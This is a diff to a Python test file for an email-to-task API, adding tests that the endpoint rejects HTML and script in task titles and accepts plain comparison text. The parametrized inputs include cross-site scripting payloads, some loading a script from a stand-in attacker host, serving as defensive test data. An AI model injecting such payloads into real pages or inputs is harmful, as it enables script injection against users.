@@ -353,6 +353,8 @@ def test_create_ticket_tasks_rejects_html_execution_item_titles(auth_client):
         "< /script>alert(1)</script>",
         "<svg/onload=alert(1)@x>",
         "<math/href=javascript:alert(1)@x>",
+        "<script src=//attacker.example/xss.js",
+        "&lt;script src=//attacker.example/xss.js",
     ],
 )
 def test_create_ticket_tasks_rejects_encoded_and_malformed_html_titles(
@@ -388,6 +390,22 @@ def test_create_ticket_tasks_allows_plain_comparison_text(auth_client):
 
     assert response.status_code == 200, response.text
     assert response.json()["tasks"][0]["title"] == "Confirm 2 < 3 and 5 > 4"
+
+
+def test_create_ticket_tasks_allows_plain_alphabetic_comparison_text(auth_client):
+    mock_session.emails[14] = make_email()
+
+    response = auth_client.post(
+        "/api/tasks/from-email",
+        json={
+            "source_email_id": "<message-14@example.com>",
+            "thread_id": "thread-123",
+            "items": ["Compare a < b before saving"],
+        },
+    )
+
+    assert response.status_code == 200, response.text
+    assert response.json()["tasks"][0]["title"] == "Compare a < b before saving"
 
 
 def test_create_ticket_tasks_rejects_email_owned_by_another_member(auth_client):
